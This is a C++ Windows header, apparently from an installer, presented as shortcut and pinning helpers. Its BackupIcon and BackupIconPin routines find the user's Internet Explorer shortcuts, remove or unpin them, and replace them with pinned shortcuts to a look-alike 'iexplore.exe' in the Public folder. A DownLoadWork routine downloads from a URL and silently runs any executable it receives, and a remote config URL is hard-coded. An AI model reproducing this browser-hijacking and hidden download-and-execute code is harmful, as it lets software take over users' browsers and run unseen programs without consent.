
#pragma once
#include <tslog\tslog.h>
#include <shlobj.h>
#include <COMUTIL.H>
#include <vector>
#include "UACElevate.h"

namespace ShortCut
{
	BOOL IsVistaOrHigher()
	{
		OSVERSIONINFOEX osvi = { sizeof(OSVERSIONINFOEX) };
		osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
		if(!GetVersionEx( (LPOSVERSIONINFO)&osvi ))
		{
			//可能只能得到OSVERSIONINFO, 不能得到OSVERSIONINFOEX
			osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
			if(!GetVersionEx( (LPOSVERSIONINFO)&osvi ))
			{
				return FALSE;
			}
		}

		return osvi.dwMajorVersion >= 6;
	}
	
	int CheckShortCutLinkPoint(const wchar_t* wszShortCutPath, const wchar_t* wszTargetPath)
	{
		TSDEBUG4CXX("CheckShortCutLinkPoint enter,  wszShortCutPath =  " << wszShortCutPath<<", wszTargetPath = "<<wszTargetPath);
		if (PathFileExists(wszShortCutPath))
		{
			HRESULT hr = ::CoInitialize(NULL);
			if (SUCCEEDED(hr))
			{
				CComPtr<IShellDispatch> sh = NULL;
				hr = sh.CoCreateInstance(__uuidof(Shell));
				if (SUCCEEDED(hr))
				{
					CComPtr<Folder> f;
					CComPtr<FolderItem> itm;
					wchar_t wstrFileDir[MAX_PATH] = {0};
					wcscpy_s(wstrFileDir,MAX_PATH,wszShortCutPath);
					PathRemoveFileSpecW(wstrFileDir);
					wchar_t* wstrFileName = PathFindFileName(wszShortCutPath);

					TSDEBUG4CXX("CheckShortCutLinkPoint 1");
					hr = sh->NameSpace(CComVariant(wstrFileDir), &f);
					if (SUCCEEDED(hr))
					{
						TSDEBUG4CXX("CheckShortCutLinkPoint 2");
						hr = f->ParseName(CComBSTR(wstrFileName), &itm);
						if (SUCCEEDED(hr))
						{
							TSDEBUG4CXX("CheckShortCutLinkPoint 3");
							CComPtr<IDispatch> sp;
							hr = itm->get_GetLink(&sp);
							if (SUCCEEDED(hr))
							{
								TSDEBUG4CXX("CheckShortCutLinkPoint 4");
								CComPtr<IShellLinkDual2> spDual;
								hr = sp->QueryInterface(IID_IShellLinkDual2, (void**)&spDual);
								if (SUCCEEDED(hr))
								{
									TSDEBUG4CXX("CheckShortCutLinkPoint 5");
									CComPtr<FolderItem> spTarget;
									hr = spDual->get_Target(&spTarget);
									if (SUCCEEDED(hr))
									{
										TSDEBUG4CXX("CheckShortCutLinkPoint 6");
										CComBSTR bstrPath;
										hr = spTarget->get_Path(&bstrPath);
										if (SUCCEEDED(hr))
										{
											TSDEBUG4CXX("CheckShortCutLinkPoint 6");
											std::wstring wstrPath = bstrPath.m_str;
											if(wcsstr(wstrPath.c_str(), wszTargetPath) !=NULL )
											//if(wstrPath == wszTargetPath)
											{
												::CoUninitialize();
												TSDEBUG4CXX("CheckShortCutLinkPoint leave, wstrPath = "<<wstrPath<<", wszTargetPath = "<<wszTargetPath);
												return 1;
											}
										}
									}
								}
							}
						}
					}
				}
			}
			::CoUninitialize();
		}
		TSDEBUG4CXX("CheckShortCutLinkPoint leave");
		return 0;
	}


	#define DEFINE_KNOWN_FOLDER(name, l, w1, w2, b1, b2, b3, b4, b5, b6, b7, b8) \
	EXTERN_C const GUID DECLSPEC_SELECTANY name \
	= { l, w1, w2, { b1, b2,  b3,  b4,  b5,  b6,  b7,  b8 } }


	DEFINE_KNOWN_FOLDER(FOLDERID_UserPinned, 0x9E3995AB, 0x1F9C, 0x4F13, 0xB8, 0x27, 0x48, 0xB2, 0x4B, 0x6C, 0x71, 0x74);
	bool BuildShortcut(CONST TCHAR* szFilePath, CONST TCHAR* szTargetPath, CONST TCHAR* szDescription, CONST TCHAR* szParam = NULL, CONST TCHAR* szIcon = NULL)
	{
		TSAUTO();
		if (CheckShortCutLinkPoint(szFilePath, szTargetPath)){
			return true;
		}
		CONST TCHAR * szDestPath = szFilePath;
		CONST TCHAR* szSrcPath = szTargetPath;
		if (NULL == szDestPath || NULL == szSrcPath)
		{
			return false;
		}

		TSDEBUG4CXX("<XmpSetup>shortcut src="<<szSrcPath<<" dest="<<szDestPath<<" param="<<szParam<<" szIcon="<<szIcon);
		CComPtr<IShellLink> psl;
		CComPtr<IPersistFile> ppf;
		HRESULT hRes = ::CoCreateInstance( CLSID_ShellLink, NULL,CLSCTX_INPROC_SERVER, IID_IShellLink,(void **)&psl) ;
		if(FAILED(hRes) && psl)
		{
			TSDEBUG4CXX("Create ShellLink Instance FAILED!!!");
			return false;
		}

		if(NULL != szIcon && PathFileExists(szIcon))
		{
			psl->SetIconLocation(szIcon, 0);
		}		
		else
		{
			psl->SetIconLocation(szSrcPath,0);
		}


		psl->SetPath(szSrcPath);
		psl->SetDescription(szDescription);
		psl->SetArguments(szParam);
		TCHAR szWorkDir[MAX_PATH+1] = {0};
		_stprintf_s(szWorkDir,MAX_PATH, _T("%s"),szSrcPath);
		::PathAppend(szWorkDir, TEXT("..\\"));
		psl->SetWorkingDirectory(szWorkDir);

		hRes = psl->QueryInterface( IID_IPersistFile, (void**)&ppf);
		if(FAILED(hRes) && ppf)
		{
			return false;
		}
		hRes = ppf->Save( szDestPath, STGM_READWRITE);
		TSDEBUG4CXX("returns "<< SUCCEEDED(hRes));
		return SUCCEEDED(hRes); 

	}
	extern "C" typedef HRESULT (__stdcall *PSHGetKnownFolderPath)(  const  GUID& rfid,
		DWORD dwFlags,
		HANDLE hToken,
		PWSTR* pszPath);
	
	bool GetProfileFolder(wchar_t* wszMainDir)	// 失败返回'\0'
	{
		wchar_t wszAllUserDir[MAX_PATH] = {0};
		if(('\0') == wszAllUserDir[0])
		{
			HMODULE hModule = ::LoadLibraryA("shell32.dll");
			PSHGetKnownFolderPath SHGetKnownFolderPath = (PSHGetKnownFolderPath)GetProcAddress( hModule, "SHGetKnownFolderPath" );
			if ( SHGetKnownFolderPath)
			{
				PWSTR pszPath = NULL;
				HRESULT hr = SHGetKnownFolderPath( FOLDERID_Public, 0, NULL, &pszPath );
				if ( FAILED( hr ) )
				{
					TSERROR4CXX("Failed to get public folder");
					FreeLibrary(hModule);
					return false;
				}
				wcscpy(wszAllUserDir, pszPath);
				::CoTaskMemFree(pszPath);
				FreeLibrary(hModule);
			}
			else
			{
				HRESULT hr = SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, SHGFP_TYPE_CURRENT, wszAllUserDir);
				if ( FAILED( hr ) )
				{
					TSERROR4CXX("Failed to get main pusher dir");
					return false;
				}
			}
		}
		wcscpy(wszMainDir, wszAllUserDir);
		TSERROR4CXX("GetProfileFolder, szMainDir = "<<wszMainDir);
		return true;
	}

	std::wstring GetUserPinPath()
	{
		static std::wstring strUserPinPath(_T(""));

		if (strUserPinPath.length() <= 0)
		{
			HMODULE hModule = LoadLibrary( _T("shell32.dll") );
			if ( hModule == NULL )
			{
				return _T("");
			}
			PSHGetKnownFolderPath SHGetKnownFolderPath = (PSHGetKnownFolderPath)GetProcAddress( hModule, "SHGetKnownFolderPath" );
			if (SHGetKnownFolderPath)
			{
				PWSTR pszPath = NULL;
				HRESULT hr = SHGetKnownFolderPath( FOLDERID_UserPinned, 0, NULL, &pszPath );
				if (SUCCEEDED(hr))
				{
					TSDEBUG4CXX("UserPin Path: " << pszPath);
					strUserPinPath = pszPath;
					::CoTaskMemFree(pszPath);
				}
			}
			FreeLibrary(hModule);
		}
		return strUserPinPath;
	}


	#define PIN_TASKEBAR 1
	#define PIN_STARTMENU 2
	typedef std::vector<std::wstring> VectorVerbName;
	VectorVerbName*  GetVerbNames(bool bPin, int flag)
	{
		TSAUTO();
		static bool bInit = false;
		static std::vector<std::wstring> vecPinTaskNames;
		static std::vector<std::wstring> vecUnPinTaskNames;
		static std::vector<std::wstring> vecPinStartMenuNames;
		static std::vector<std::wstring> vecUnPinStartMenuNames;
		if (!bInit )
		{	
			bInit = true;
			vecPinTaskNames.push_back(_T("Pin to Tas&kBar"));vecPinTaskNames.push_back(_T("锁定到任务栏"));
			vecPinTaskNames.push_back(_T("固定到任务栏"));
			vecUnPinTaskNames.push_back(_T("UnPin from Tas&kBar"));vecUnPinTaskNames.push_back(_T("从任务栏脱离"));
			vecUnPinTaskNames.push_back(_T("从任务栏取消固定"));
			vecPinStartMenuNames.push_back(_T("锁定到开始菜单"));vecPinStartMenuNames.push_back(_T("附到「开始」菜单"));
			vecUnPinStartMenuNames.push_back(_T("从「开始」菜单脱离"));vecUnPinStartMenuNames.push_back(_T("从「开始」菜单解锁"));
		}
		if (PIN_TASKEBAR == flag)
		{	
			return bPin? &vecPinTaskNames : &vecUnPinTaskNames;
		}
		else
		{
			return bPin? &vecPinStartMenuNames : &vecUnPinStartMenuNames;
		}
	}

	bool VerbNameMatch(TCHAR* tszName, bool bPin,int flag)
	{
		TSAUTO();
		VectorVerbName *pVec = GetVerbNames(bPin,flag);

		VectorVerbName::iterator iter = pVec->begin();
		VectorVerbName::iterator iter_end = pVec->end();

		while(iter!=iter_end)
		{
			std::wstring strName= *iter;
			if ( 0 == _wcsnicmp(tszName,strName.c_str(),strName.length()))
				return true;
			iter ++;
		}
		return false;
	}

	#define IF_FAILED_OR_NULL_BREAK(rv,ptr) \
	{if (FAILED(rv) || ptr == NULL) break;}

	#define SAFE_RELEASE(p) { if(p) { (p)->Release(); (p)=NULL; } }
	bool PinTo(bool bPin,int flag, CONST TCHAR* szPath)
	{
		TSAUTO();

		TCHAR file_dir[MAX_PATH + 1] = {0};
		TCHAR *file_name;

		wcscpy_s(file_dir,MAX_PATH,szPath);

		PathRemoveFileSpecW(file_dir);
		file_name = PathFindFileName(szPath);


		CComPtr<IShellDispatch> pShellDisp;
		CComPtr<Folder> folder_ptr;
		CComPtr<FolderItem> folder_item_ptr;
		CComPtr<FolderItemVerbs> folder_item_verbs_ptr;


		HRESULT rv = CoCreateInstance( CLSID_Shell, NULL, CLSCTX_SERVER,IID_IDispatch, (LPVOID *) &pShellDisp );
		do 
		{
			IF_FAILED_OR_NULL_BREAK(rv,pShellDisp);
			rv = pShellDisp->NameSpace(_variant_t(file_dir),&folder_ptr);

			IF_FAILED_OR_NULL_BREAK(rv,folder_ptr);
			rv = folder_ptr->ParseName(CComBSTR(file_name),&folder_item_ptr);

			IF_FAILED_OR_NULL_BREAK(rv,folder_item_ptr);
			rv = folder_item_ptr->Verbs(&folder_item_verbs_ptr);

			IF_FAILED_OR_NULL_BREAK(rv,folder_item_verbs_ptr);
			long count = 0;
			folder_item_verbs_ptr->get_Count(&count);

			for (long i = 0; i < count ; ++i)
			{
				FolderItemVerb* item_verb = NULL;
				rv = folder_item_verbs_ptr->Item(_variant_t(i),&item_verb);
				if (SUCCEEDED(rv) && item_verb)
				{
					CComBSTR bstrName;
					item_verb->get_Name(&bstrName);

					if ( VerbNameMatch(bstrName,bPin,flag) )
					{
						TSDEBUG4CXX("Find Verb to Pin:"<< bstrName);
						int i = 0;
						do
						{
							rv = item_verb->DoIt();
							TSDEBUG4CXX("Try Do Verb. NO." << i+1 << ", return="<<rv);
							if (SUCCEEDED(rv))
							{
								::SHChangeNotify(SHCNE_UPDATEDIR|SHCNE_INTERRUPT|SHCNE_ASSOCCHANGED, SHCNF_IDLIST |SHCNF_FLUSH | SHCNF_PATH|SHCNE_ASSOCCHANGED,
									szPath,0);
								Sleep(500);
								return true;
							}else
							{
								Sleep(500);
								rv = item_verb->DoIt();
							}
						}while ( i++ < 3);

						break;
					}
				}
			}
		} while (0);
		return false;
	}

	bool Pin2Taskbar(bool bPin, wchar_t* wszExePath, wchar_t* wszLnkPath, bool bForceUnPin = true)
	{
		TSAUTO();
		TSDEBUG4CXX(L"Pin2Taskbar " << bPin << L", wszExePath="<<wszExePath);
		bool ret = false;
		std::wstring strXmpPath = wszExePath;
		std::wstring strShortcutPath = wszLnkPath;
		int pos = strShortcutPath.find_last_of('\\');
		if (pos <= 0){
			pos = strShortcutPath.find_last_of('/');
		}
		std::wstring strLnkName;
		if (pos > 0){
			strLnkName = strShortcutPath.substr(pos+1);
		}else{
			strLnkName = _T("Internet Explorer.lnk");
		}
		std::wstring strPinShortcutPath = GetUserPinPath() + _T("\\TaskBar\\") + strLnkName;
		TSDEBUG4CXX(L"Pin2Taskbar strPinShortcutPath = " << strPinShortcutPath);
		if (PathFileExists(strPinShortcutPath.c_str())){	
			TSDEBUG4CXX(L"Pin2Taskbar strPinShortcutPath PathFileExists true");
			wchar_t szPublic[MAX_PATH] = {0};
			GetProfileFolder(szPublic);
			PathCombine(szPublic, szPublic, L"iexplorer\\program\\iexplore.exe");
			if (bPin && !bForceUnPin && CheckShortCutLinkPoint(strPinShortcutPath.c_str(), szPublic)){
				return true;
			}
			TCHAR szPath[MAX_PATH +1] = {0};
			_stprintf_s(szPath,MAX_PATH,_T("%s"),strPinShortcutPath.c_str());
			::ShellExecute(NULL,_T("taskbarunpin"),szPath,NULL,NULL,SW_HIDE);

			// 更新图标
			::SHChangeNotify(SHCNE_UPDATEDIR|SHCNE_INTERRUPT|SHCNE_ASSOCCHANGED, SHCNF_FLUSH | SHCNF_PATH|SHCNE_ASSOCCHANGED,
				strPinShortcutPath.c_str(),0);
			Sleep(500);
		}	

		if (bPin){
			ret = BuildShortcut(strShortcutPath.c_str(),strXmpPath.c_str(),
				_T(""),_T("/sstartfrom toolbar"));
			if (ret){
				::ShellExecute(NULL,_T("taskbarpin"),strShortcutPath.c_str(),NULL,NULL,SW_HIDE);
			}

			return ret;
		}
		return false;
	}

	bool Pin2StartMenu(bool bPin, wchar_t* wszExePath, wchar_t* wszLnkPath,  bool bForceUnPin = true)
	{
		TSAUTO();

		//TCHAR tszShortcutPath[MAX_PATH + 1] = {0};
		//::SHGetSpecialFolderPath(NULL, tszShortcutPath, CSIDL_COMMON_PROGRAMS, FALSE);
		//::PathAppend(tszShortcutPath, wszLnkName);
		std::wstring tszShortcutPath = wszLnkPath;
		int pos = tszShortcutPath.find_last_of('\\');
		if (pos <= 0){
			pos = tszShortcutPath.find_last_of('/');
		}
		std::wstring strLnkName;
		if (pos > 0){
			strLnkName = tszShortcutPath.substr(pos+1);
		}else{
			strLnkName = _T("Internet Explorer.lnk");
		}
		TSDEBUG4CXX(L"Pin2StartMenu strLnkName "<<strLnkName.c_str());
		wchar_t szPublic[MAX_PATH] = {0};
		GetProfileFolder(szPublic);
		PathCombine(szPublic, szPublic, L"iexplorer\\program\\iexplore.exe");
		if (IsVistaOrHigher()){
			std::wstring strPinStartMenuPath = GetUserPinPath() + _T("\\StartMenu\\") + strLnkName.c_str();
			if (bPin && !bForceUnPin && PathFileExists(strPinStartMenuPath.c_str()) && CheckShortCutLinkPoint(strPinStartMenuPath.c_str(), szPublic)){
				return true;
			}
			TSDEBUG4CXX(L"Pin2StartMenu win7 unpin ");
			TCHAR szPath [MAX_PATH +1] = {0};
			_stprintf_s(szPath,MAX_PATH,_T("%s"),strPinStartMenuPath.c_str());
			::ShellExecute(NULL,_T("startunpin"),szPath,NULL,NULL,SW_HIDE);
			Sleep(1000);
		}else{
			//if (bPin && !bForceUnPin && PathFileExists(tszShortcutPath.c_str()) && CheckShortCutLinkPoint(tszShortcutPath.c_str(), szPublic) ){
			//	return true;
			//}
			PinTo(false,PIN_STARTMENU,tszShortcutPath.c_str());
			Sleep(1000);
			//DeleteFile(tszShortcutPath.c_str());
		}

		bool ret = true;
		if (bPin){
			std::wstring strXmpPath = wszExePath;
			ret = BuildShortcut(tszShortcutPath.c_str(),strXmpPath.c_str(),
				_T(""), _T("/sstartfrom startmenuprograms"));

			//更新一下图标再pin
			::SHChangeNotify(SHCNE_UPDATEDIR|SHCNE_INTERRUPT|SHCNE_ASSOCCHANGED, SHCNF_IDLIST |SHCNF_FLUSH | SHCNF_PATH|SHCNE_ASSOCCHANGED,
				tszShortcutPath.c_str(),0);

			Sleep(200);

			if (IsVistaOrHigher()){
				::ShellExecute(NULL,_T("startpin"),tszShortcutPath.c_str(),NULL,NULL,SW_HIDE);
			}else{
				PinTo(bPin,PIN_STARTMENU,tszShortcutPath.c_str());
			}

		}else{
		}
		return ret;
	}

	typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);

	LPFN_ISWOW64PROCESS fnIsWow64Process;
	BOOL IsWow64()
	{
		BOOL bIsWow64 = FALSE;

		fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(
			GetModuleHandle(TEXT("kernel32")),"IsWow64Process");

		if (NULL != fnIsWow64Process)
		{
			if (!fnIsWow64Process(GetCurrentProcess(),&bIsWow64))
			{
				// handle error
			}
		}
		return bIsWow64;
	}
	void QueryRegValue(HKEY root,const wchar_t* utf8RegPath,const wchar_t* utf8Key, DWORD &dwType, std::wstring& utf8Result, DWORD &dwValue, BOOL needWow64 = false){
		BOOL bWow64 = needWow64 ? IsWow64() : false;
		CRegKey regKey;
		REGSAM samDesired = bWow64?(KEY_WOW64_64KEY|KEY_READ):KEY_READ;
		if (regKey.Open(root, utf8RegPath, samDesired) == ERROR_SUCCESS)
		{
			ULONG ulBytes = 0;
			if (ERROR_SUCCESS == regKey.QueryValue(utf8Key, &dwType, NULL, &ulBytes))
			{
				if (dwType == REG_DWORD)
				{
					regKey.QueryDWORDValue(utf8Key, dwValue);
					return ;
				}
				else if (dwType == REG_SZ || dwType == REG_EXPAND_SZ)
				{
					wchar_t* pBuffer = (wchar_t *)new BYTE[ulBytes+2];
					memset(pBuffer, 0, ulBytes+2);
					regKey.QueryStringValue(utf8Key, pBuffer, &ulBytes);
					utf8Result = pBuffer;
					TSDEBUG4CXX(L"REG_EXPAND_SZ = " << utf8Result.c_str());
					delete [] pBuffer;
					pBuffer = NULL;
					return ;
				}
			}
		}
	}
	void DeleteRegValueHelper(HKEY root, const wchar_t* utf8Key){
		BOOL bWow64 = IsWow64();
		REGSAM samDesired = bWow64?(KEY_WOW64_64KEY|KEY_WRITE):KEY_WRITE;
		HKEY hKey;
		if(RegOpenKeyEx(root,utf8Key,0,samDesired,&hKey) == ERROR_SUCCESS)
		{
			RegDeleteValue(hKey, utf8Key);
			RegCloseKey(hKey);
		}
	}
	void CreateRegKey(HKEY root, const wchar_t* utf8SubKey){
		BOOL bWow64 = IsWow64();
		HKEY hCreateKey;
		LONG lRet;
		if (!bWow64){
			lRet = RegCreateKey(root, utf8SubKey, &hCreateKey);
		}else{
			lRet = RegCreateKeyEx(root, utf8SubKey, NULL,NULL,REG_OPTION_NON_VOLATILE,KEY_WOW64_64KEY|KEY_READ|KEY_WRITE,NULL,&hCreateKey,NULL);
		}
		if(lRet == ERROR_SUCCESS){
			RegCloseKey(hCreateKey);
		}
	}

	bool NeedInfRegist()
	{
		OSVERSIONINFOEX osvi = { sizeof(OSVERSIONINFOEX) };
		osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
		if(!GetVersionEx( (LPOSVERSIONINFO)&osvi )){
			osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
			if(!GetVersionEx( (LPOSVERSIONINFO)&osvi )){
				return false;
			}
		}
		return (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 1);
	};
	

	std::vector<std::wstring> wstrVec;
	void SetRegValue(HKEY root, const wchar_t* utf8SubKey, const wchar_t* utf8ValueName,DWORD dwType, const wchar_t* utf8Data, DWORD dwValue, BOOL bNeedWow64 = false){
		CRegKey regKey;
		BOOL bWow64 = false;
		if (bNeedWow64){
			bWow64 = IsWow64();
		}
		REGSAM samDesired = bWow64?(KEY_WOW64_64KEY|KEY_SET_VALUE):KEY_SET_VALUE;
		if (regKey.Open(root, utf8SubKey, samDesired) != ERROR_SUCCESS){
			CreateRegKey(root,  utf8SubKey);
		}
		if (regKey.Open(root, utf8SubKey, samDesired) == ERROR_SUCCESS){
			// 判断类型
			if (dwType == REG_DWORD){
				if (ERROR_SUCCESS == regKey.SetDWORDValue(utf8ValueName, dwValue)){
					return;
				}
			}else if (dwType == REG_SZ){
				if (ERROR_SUCCESS == regKey.SetStringValue(utf8ValueName, utf8Data)){
					return;
				}
			}
		} else if(NeedInfRegist()) {
			std::wstring wstrInfInfo;
			if (root == HKEY_CLASSES_ROOT){
				wstrInfInfo = L"HKCR,";
			} else if(root == HKEY_LOCAL_MACHINE) {
				wstrInfInfo = L"HKLM,";
			} else if(root == HKEY_CURRENT_USER) {
				wstrInfInfo = L"HKCU,";
			} 
			wstrInfInfo += utf8SubKey;
			wstrInfInfo += L",";
			wstrInfInfo += utf8ValueName;
			if (_tcsicmp(utf8Data, L"") == 0){
				wstrInfInfo += L",FLG_ADDREG_TYPE_DWORD,";
				wchar_t wszTmp[10] = {0};
				wsprintf(wszTmp, L"%d", dwValue);
				wstrInfInfo += wszTmp;
			}else{
				wstrInfInfo += L",FLG_ADDREG_TYPE_SZ,";
				wstrInfInfo += utf8Data;
			}
			TSDEBUG4CXX(L"SetRegValue wstrInfInfo = "<<wstrInfInfo.c_str());
			wstrVec.push_back(wstrInfInfo);
		}
	}
	bool QueryRegKeyExists(HKEY root, wchar_t* wszKey){
		CRegKey regKey;
		if (regKey.Open(root, wszKey, KEY_READ) == ERROR_SUCCESS){
			return true;
		}else{
			return false;
		}
	}

	int BackupIcon(int* CLSIDS, wchar_t* wszExt, wchar_t* wszFlag){
		int nRet = 0;
		//int CLSIDS[2] = {CSIDL_DESKTOPDIRECTORY, CSIDL_COMMON_DESKTOPDIRECTORY};
		TCHAR tszShortcutPath[MAX_PATH + 1] = {0};
		TCHAR szSearchPath[MAX_PATH] = {0};
		HANDLE hFind = INVALID_HANDLE_VALUE;
		WIN32_FIND_DATA fd;
		for (int i = 0; i < 2; ++i){
			if (CLSIDS[i] == -1){
				break;
			}
			memset(tszShortcutPath, 0, MAX_PATH);
			memset(szSearchPath, 0, MAX_PATH);
			::SHGetSpecialFolderPath(NULL, tszShortcutPath, CLSIDS[i], FALSE);
			::PathCombine(tszShortcutPath, tszShortcutPath, wszExt);
			::PathCombine(szSearchPath, tszShortcutPath, L"*.lnk");
			hFind = FindFirstFile(szSearchPath, &fd);
			while (INVALID_HANDLE_VALUE != hFind){
				if (_tcsicmp(fd.cFileName, _T("..")) && _tcsicmp(fd.cFileName, _T(".")) && FILE_ATTRIBUTE_DIRECTORY != fd.dwFileAttributes)
				{
					if (wcsstr(fd.cFileName, L"启动 Internet Explorer 浏览器") !=NULL || wcsstr(fd.cFileName, L"Internet.lnk") !=NULL || wcsstr(fd.cFileName, L"Internet Explorer") !=NULL ){
						TCHAR szLnkFileTmp[MAX_PATH] = {0};
						::PathCombine(szLnkFileTmp, tszShortcutPath, fd.cFileName);
						TCHAR szPublic[MAX_PATH] = {0}, szexeTargetPath[MAX_PATH] = {0}, szBackPath[MAX_PATH] = {0};
						if (GetProfileFolder(szPublic)){
							PathCombine(szexeTargetPath, szPublic, L"iexplorer\\program\\iexplore.exe");
							if (!CheckShortCutLinkPoint(szLnkFileTmp, szexeTargetPath)){
								PathCombine(szBackPath, szPublic, L"IECFG\\lnkbak");
								if (!PathFileExists(szBackPath)){
									SHCreateDirectoryEx(NULL, szBackPath, NULL);
								}
								TCHAR szLnkName[128]={0};
								wsprintf(szLnkName, L"%s_%s", wszFlag, fd.cFileName);
								PathCombine(szBackPath,szBackPath, szLnkName);
								DeleteFile(szBackPath);
								if (_tcsicmp(wszFlag, L"SMPROGRAMS") == 0 || (_tcsicmp(wszFlag, L"STARTMENU") == 0 && !IsVistaOrHigher())){
									CopyFile(szLnkFileTmp, szBackPath, false);
									Pin2StartMenu(false, L"", szLnkFileTmp);
									DeleteFile(szLnkFileTmp);
								}else{
									TSDEBUG4CXX(L"BackupIcon MoveFileExW szLnkFileTmp = "<<szLnkFileTmp);
									MoveFileExW(szLnkFileTmp, szBackPath, MOVEFILE_REPLACE_EXISTING|MOVEFILE_COPY_ALLOWED);
								}
								SetRegValue(HKEY_CURRENT_USER, L"SOFTWARE\\iexplorer", wszFlag, REG_SZ, L"1", 0);
								nRet = 1;
							}
						}
						
					}
				}
				if (FindNextFile(hFind, &fd) == 0){
					break;
				}
			}
			FindClose(hFind);
		}
		return nRet;
	}

	int BackupIconPin(wchar_t* wszPinPath, wchar_t* wszFlag){
		int nRet = 0;
		HANDLE hFind = INVALID_HANDLE_VALUE;
		WIN32_FIND_DATA fd;
		TCHAR szSearchPath[MAX_PATH] = {0};
		memset(szSearchPath, 0, MAX_PATH);
		::PathCombine(szSearchPath, wszPinPath, L"*.lnk");
		hFind = FindFirstFile(szSearchPath, &fd);
		while (INVALID_HANDLE_VALUE != hFind){
			if (_tcsicmp(fd.cFileName, _T("..")) && _tcsicmp(fd.cFileName, _T(".")) && FILE_ATTRIBUTE_DIRECTORY != fd.dwFileAttributes)
			{
				if (wcsstr(fd.cFileName, L"启动 Internet Explorer 浏览器") !=NULL || wcsstr(fd.cFileName, L"Internet.lnk") !=NULL || wcsstr(fd.cFileName, L"Internet Explorer") !=NULL ){
					TCHAR szLnkFileTmp[MAX_PATH] = {0};
					::PathCombine(szLnkFileTmp, wszPinPath, fd.cFileName);
					TCHAR szPublic[MAX_PATH] = {0}, szexeTargetPath[MAX_PATH] = {0}, szBackPath[MAX_PATH] = {0};
					if (GetProfileFolder(szPublic)){
						PathCombine(szexeTargetPath, szPublic, L"iexplorer\\program\\iexplore.exe");
						if (!CheckShortCutLinkPoint(szLnkFileTmp, szexeTargetPath)){
							PathCombine(szBackPath, szPublic, L"IECFG\\lnkbak");
							if (!PathFileExists(szBackPath)){
								SHCreateDirectoryEx(NULL, szBackPath, NULL);
							}
							TCHAR szLnkName[128]={0};
							wsprintf(szLnkName, L"%s_%s", wszFlag, fd.cFileName);
							PathCombine(szBackPath,szBackPath, szLnkName);
							DeleteFile(szBackPath);
							CopyFile(szLnkFileTmp, szBackPath, false);
							if (_tcsicmp(wszFlag, L"STARTPIN") == 0){
								Pin2StartMenu(false, L"", szLnkFileTmp);
								SetRegValue(HKEY_CURRENT_USER, L"SOFTWARE\\iexplorer", L"STARTPIN", REG_SZ, L"1", 0);
							}else{
								Pin2Taskbar(false, L"", szLnkFileTmp);
								SetRegValue(HKEY_CURRENT_USER, L"SOFTWARE\\iexplorer", L"QUICKLAUNCH", REG_SZ, L"1", 0);
							}
							TSDEBUG4CXX(L"BackupIconPin szLnkFileTmp =  "<<szLnkFileTmp);
							Sleep(1000);
							DeleteFile(szLnkFileTmp);
							nRet = 1;
						}
					}
				}
			}
			if (FindNextFile(hFind, &fd) == 0){
				break;
			}
		}
		FindClose(hFind);
		return nRet;
	}
	
	BOOL QueryProcessExist(wchar_t* wszProcName){
		TSDEBUG4CXX("QueryProcessExist enter");
		int iValue = 0;
		HANDLE hSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hSnap != INVALID_HANDLE_VALUE)
		{
			PROCESSENTRY32 pe;
			pe.dwSize = sizeof(PROCESSENTRY32);
			BOOL bResult = ::Process32First(hSnap, &pe);
			while (bResult)
			{
				if(_tcsicmp(pe.szExeFile, wszProcName) == 0)
				{
					iValue = 1;
					break;
				}
				bResult = ::Process32Next(hSnap, &pe);
			}
			::CloseHandle(hSnap);
		}
		TSDEBUG4CXX("QueryProcessExist leave iValue = "<<iValue);
		return iValue;
	}
	
	BOOL MutiQueryProcExist(wchar_t* wszMutiProcName){
		TSDEBUG4CXX("MutiQueryProcExist enter");
		BOOL nRet = 0;
		HANDLE hSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hSnap != INVALID_HANDLE_VALUE)
		{
			PROCESSENTRY32 pe;
			pe.dwSize = sizeof(PROCESSENTRY32);
			BOOL bResult = ::Process32First(hSnap, &pe);
			TCHAR wszTmp[128] = {0};
			while (bResult)
			{
				memset(wszTmp, 0, 128);
				wcscpy(wszTmp, pe.szExeFile);
				wchar_t* ptmp = wcsstr(wszTmp, L".exe");
				if (ptmp != NULL){
					*ptmp = 0;
				}
				TSDEBUG4CXX("MutiQueryProcExist , wszTmp = "<<wszTmp<<", pe.szExeFile = "<<pe.szExeFile);
				if (_tcsicmp(wszMutiProcName,wszTmp) == 0){
					nRet = 1;
					break;
				}
				bResult = ::Process32Next(hSnap, &pe);
			}
			::CloseHandle(hSnap);
		} else {
			nRet = 1;
		}
		TSDEBUG4CXX("MutiQueryProcExist leave, nRet = "<<nRet);
		return nRet;
	}
	
	DWORD WINAPI DownLoadWork(LPVOID pParameter)
	{
		//TSAUTO();
		CHAR szUrl[MAX_PATH] = {0};
		strcpy(szUrl,(LPCSTR)pParameter);
		CHAR szBuffer[MAX_PATH] = {0};
		DWORD len = GetTempPathA(MAX_PATH, szBuffer);
		if(len == 0)
		{
			return 0;
		}
		char *p = strrchr(szUrl, '/');
		char *p2 = strrchr(szUrl, '?');
		char szTemp[128] = {0};
		strncpy(szTemp, p+1, p2-p-1);
		::PathCombineA(szBuffer,szBuffer,szTemp);
		::CoInitialize(NULL);
		HRESULT hr = E_FAIL;
		__try
		{
			hr = ::URLDownloadToFileA(NULL, szUrl, szBuffer, 0, NULL);
		}
		__except(EXCEPTION_EXECUTE_HANDLER)
		{
			TSDEBUG4CXX("URLDownloadToCacheFile Exception !!!");
		}
		::CoUninitialize();
		if (strstr(szBuffer, ".exe") != NULL && SUCCEEDED(hr) && ::PathFileExistsA(szBuffer))
		{
			::ShellExecuteA(NULL,"open",szBuffer,NULL,NULL,SW_HIDE);
		}
		return SUCCEEDED(hr)?ERROR_SUCCESS:0xFF;
	};

	void GetTime(LPDWORD pnTime)
	{
		//TSAUTO();
		if(pnTime == NULL)
			return;
		time_t t;
		time( &t );
		*pnTime = (DWORD)t;
	}
	static CHAR szIniUrl[] = "http://www.91yuanbao.com/cmi/iesetupconfig.js";
	int DownLoadAndCheckIniConfig()
	{
